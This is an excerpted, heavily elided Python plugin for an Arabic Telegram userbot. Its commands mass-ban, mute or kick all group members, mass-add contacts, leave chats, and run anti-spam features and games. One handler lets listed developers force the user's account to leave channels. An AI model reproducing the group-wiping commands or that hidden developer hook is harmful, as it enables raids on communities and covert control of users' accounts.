...
async def ban_user(chat_id, i, rights):
    try:
        await final313(functions.channels.EditBannedRequest(chat_id, i, rights))
        return True, None
    except Exception as exc:
        return False, str(exc)        

#F16
@final313.ar_cmd(pattern="(اضف جهاتي|اضف جهتي)")
async def reda_add_con(event):
    global stop_addCon
    await event.delete()
    
    F16result = await event.client(functions.channels.GetParticipantRequest(
        event.chat_id, (await event.client.get_me()).id
    ))

    if not F16result.participant.admin_rights.invite_users:
...
@final313.ar_cmd(pattern="(ايقاف الاضافة|ايقاف|ايقاف الاضافه)")
async def stop_add_con(event):
    global stop_addCon
    stop_addCon = True


@final313.ar_cmd(pattern="ارسل")
...
@final313.ar_cmd(pattern="حظر_الكل(?:\s|$)([\s\S]*)")
async def banall(event):
     ...
     is_admin = False
     try:
         partici_ = await final313(GetParticipantRequest(
           event.chat_id,
           event.sender_id
         ))
     ...
     usrnum = 0
     async for usr in final313.iter_participants(chat_id):
         ...
         if str(userb) == "None":
             userb = usr.id
             usrtxt = f"{msg} {userb}"
         await final313.send_message(chat_id, usrtxt)
     ...
     try:
         ...
         pass
@final313.ar_cmd(pattern="كتم_الكل(?:\s|$)([\s\S]*)")
async def muteall(event):
     ...
     try:
         ...
         pass
@final313.ar_cmd(pattern="طرد_الكل(?:\s|$)([\s\S]*)")
async def kickall(event):
     ...
     try:
         ...
         pass
@final313.ar_cmd(pattern="الغاء التفليش")
...
@final313.ar_cmd(pattern="مغادرة الكروبات")
async def F16 (event):
    ...
    try:
        ...
        for group in gr:
            if group not in dd:
                await final313.delete_dialog(group)
                num += 1
                await sleep(1)
        if num >=1:
...
async def ffinal(event):
    if event.message.message.startswith("اطلع") and event.sender_id in DevJoker:
        ...
        if channel_username:
            try:
                entity = await final313.get_entity(channel_username)
                if isinstance(entity, Channel) and entity.creator or entity.admin_rights:
                    ...
                    await final313(LeaveChannelRequest(channel_username))
...
@final313.ar_cmd(pattern="مغادرة القنوات")
async def ffinal (event):
...
@final313.ar_cmd(pattern="تصفية الخاص")
...
@final313.ar_cmd(pattern="تصفية البوتات")
async def ffinal(event):
...
# الكود من كتابة فريق فـاينل بس تسرقة تنشر بقناة الفضايح انتَ وقناتك 🖤
@final313.ar_cmd(pattern=r"ذكاء(.*)")
async def sajad(event):
...
is_Reham = False
No_group_Joker = "@z3zz_zsupport"
# يا يلفاشل هم الك نيه تاخذه وتنشره بسورسك 🤣
active_alvipfinal = []

@final313.ar_cmd(pattern=r"الذكاء تفعيل")
async def enable_bot(event):
    global is_Reham
    if not is_Reham:
        is_Reham = True
        active_alvipfinal.append(event.chat_id)
...
@final313.ar_cmd(pattern=r"الذكاء تعطيل")
async def disable_bot(event):
    global is_Reham
    if is_Reham:
        is_Reham = False
        active_alvipfinal.remove(event.chat_id)
        await event.edit("**⌁⌁︙ تم تعطيل امر الذكاء الاصطناعي.**")
    else:
        await event.edit("**⌁⌁︙ الزر مُعطّل بالفعل.**")
@final313.on(events.NewMessage(incoming=True))
async def reply_to_sajad(event):
    if not is_Reham:
        return
    if event.is_private or event.chat_id not in active_alvipfinal:
        return
    message = event.message
...
async def ffinal(event):
    if not Ya_ffinal:
        return
    if event.is_private or event.chat_id not in active_vipfinal:
        return
    sender_id = event.sender_id
    if sender_id != 5434703779:
        if isinstance(event.message.entities, list) and any(isinstance(entity, MessageEntityCustomEmoji) for entity in event.message.entities):
            ...
            alvipfinal_entity = await final313.get_entity(sender.id)
            alvipfinal_profile = f"[{alvipfinal_entity.first_name}](tg://user?id={alvipfinal_entity.id})"
            await event.reply(f"**⌁⌁︙ عذرًا {alvipfinal_profile}، يُرجى عدم إرسال الرسائل التي تحتوي على إيموجي المُميز**")
@final313.ar_cmd(pattern="المميز تفعيل")
async def disable_emoji_blocker(event):
    global Ya_ffinal
    Ya_ffinal = True
    active_vipfinal.append(event.chat_id)
    await event.edit("**⌁⌁︙ ✓ تم تفعيل امر منع الايموجي المُميز بنجاح**")
@final313.ar_cmd(pattern="المميز تعطيل")
async def disable_emoji_blocker(event):
    global Ya_ffinal
    Ya_ffinal = False
    active_vipfinal.remove(event.chat_id)
    await event.edit("**⌁⌁︙ تم تعطيل امر منع الايموجي المُميز بنجاح ✓ **")
remove_admins_alvipfinal = {}
#الكود تمت كتابته من قبل مطورين فـاينل اذا الك نية تخمطه اذكر حقوق السورس @z3zz_z
@final313.on(events.ChatAction)
async def ffinal(event):
    if gvarstatus("Mn3_Kick"):
        if event.user_kicked:
            ...
            if chat and user_id:
                now = datetime.now()
                if user_id in remove_admins_alvipfinal:
                    if (now - remove_admins_alvipfinal[user_id]).seconds < 60:
                        admin_info = await event.client.get_entity(user_id)
                        vipfinal_link = f"[{admin_info.first_name}](tg://user?id={admin_info.id})"
                        await event.reply(f"**⌁⌁︙ تم تنزيل المشرف {vipfinal_link} بسبب قيامه بعملية تفليش فاشلة 🤣**")
                        await event.client.edit_admin(chat, user_id, change_info=False)
                    remove_admins_alvipfinal.pop(user_id)
                    remove_admins_alvipfinal[user_id] = now
                else:
                    remove_admins_alvipfinal[user_id] = now

@final313.ar_cmd(pattern="منع_التفليش", require_admin=True)
async def ffinal_alvipfinal(event):
    addgvar("Mn3_Kick", True)
    await event.edit("**⌁⌁︙ تم تفعيل منع التفليش للمجموعة بنجاح ✓**")

@final313.ar_cmd(pattern="سماح_التفليش", require_admin=True)
async def ffinal_alvipfinal(event):
    delgvar("Mn3_Kick")
    await event.edit("**⌁⌁︙ تم تفعيل منع التفليش للمجموعة بنجاح ✓**")
message_counts = {}
...
async def handle_new_message(event):
    ...
    if message_counts[user_id]['count'] >= 3:
        try:
            await final313.edit_permissions(event.chat_id, user_id, send_messages=False)
            sender = await event.get_sender()
            alvipfinal_entity = await final313.get_entity(sender.id)
            alvipfinal_profile = f"[{alvipfinal_entity.first_name}](tg://user?id={alvipfinal_entity.id})"
            explanation_message = f"**⌁⌁︙ تم تقييد {alvipfinal_profile} من إرسال الرسائل بسبب تفعيله نشر التلقائي**"
...
async def handle_messages(event):
    if gvarstatus("5a9_dis"):
        sender_id = event.sender_id
        current_user_id = await final313.get_me()
        if event.is_private and sender_id != current_user_id.id:
            await event.delete()
            if sender_id not in alvipfinal_Menu:
                alvipfinal_time = alvipfinal_waqt()
                alvipfinal_message = gvarstatus("alvipfinal_message") or f"صاحب الحساب قافل خاصة قبل يلا دعبل"
                alvipfinal_url = gvarstatus("alvipfinal_url") or "https://telegra.ph/file/ee30cda28bd1346e54cb3.jpg"
                await final313.send_file(sender_id, alvipfinal_url, caption=f'**{alvipfinal_message}**\n**مدة الغياب: {alvipfinal_time}**')
                alvipfinal_Menu.add(sender_id)
@final313.ar_cmd(pattern="الخاص تعطيل")
async def vipfinal5a9(event: Message):
    global afk_start_time
    addgvar("5a9_dis", True)
    afk_start_time = datetime.now()
    await event.edit('**⌁⌁︙ تم قفل الخاص بنجاح الان لا احد يمكنهُ مراسلتك**')
@final313.ar_cmd(pattern="الخاص تفعيل")
async def vipfinal5a9(event: Message):
    global afk_start_time
    delgvar("5a9_dis")
    afk_start_time = None
    alvipfinal_Menu.clear()
...
async def get_bot_entity():
    return await final313.get_entity('me')

@final313.on(events.NewMessage(outgoing=True, pattern=r'\.اسرع (.*)'))
    ...
    if is_game_started and not is_word_sent and word.lower() in event.raw_text.lower():
        if event.chat_id:
            ...
            if bot_entity and event.sender_id != bot_entity.id:
                ...
                points_text = '\n'.join([f'{i+1}• {(await final313.get_entity(participant_id)).first_name}: {participant_points}' for i, (participant_id, participant_points) in enumerate(sorted_points)])
                await final313.send_message(event.chat_id, f'الف مبرووووك 🎉 الاعب ( {sender_first_name} ) فاز! \n اصبحت نقاطة: {points[winner_id]}\nنقاط المشاركين:\n{points_text}')
vipfinal = [
    "تلعب وخوش تلعب 👏🏻",
    "لك عاش يابطل استمر 💪🏻",
...
async def handle_clue(event):
    ...
    if not group_game_status[chat_id]['is_game_started2']:
        ...
        group_game_status[chat_id]['vipfinal_player'] = None
...
@final313.on(events.NewMessage(pattern=r'\طك (\d+)'))
async def handle_strike(event):
    global group_game_status, correct_answer, game_board
    chat_id = event.chat_id
    if chat_id in group_game_status and group_game_status[chat_id]['is_game_started2'] and event.sender_id == group_game_status[chat_id]['vipfinal_player']:
        ...
        if strike_position == correct_answer:
            ...
            i0i0ii = random.choice(vipfinal)
            await event.reply(f"**{i0i0ii}**\n{format_board(game_board, numbers_board)}")

@final313.on(events.NewMessage(pattern=r'\جيب (\d+)'))
    ...
    if chat_id in group_game_status and group_game_status[chat_id]['is_game_started2'] and event.sender_id == group_game_status[chat_id]['vipfinal_player']:
        ...
        if 1 <= guess <= 6:
            if guess == correct_answer:
                ...
                points_text = '\n'.join([f'{i+1}• {(await final313.get_entity(participant_id)).first_name}: {participant_points}' for i, (participant_id, participant_points) in enumerate(sorted_points)])
                game_board = [["💍" if i == correct_answer - 1 else "🖐️" for i in range(6)]]
                await final313.send_message(event.chat_id, f'الف مبروووك 🎉 الاعب ( {sender_first_name} ) وجد المحبس 💍!\n{format_board(game_board, numbers_board)}')
                game_board = [row[:] for row in original_game_board]
                await final313.send_message(event.chat_id, f'نقاط الاعب : {points[winner_id]}\nنقاط المشاركين:\n{points_text}')
            else:
                game_board = [["💍" if i == correct_answer - 1 else "🖐️" for i in range(6)]]
...
@final313.on(events.NewMessage(pattern=r'\انا'))
async def handle_incoming_message(event):
    ...
    if group_game_status[chat_id]['is_game_started2'] and not group_game_status[chat_id]['vipfinal_player']:
        group_game_status[chat_id]['vipfinal_player'] = event.sender_id
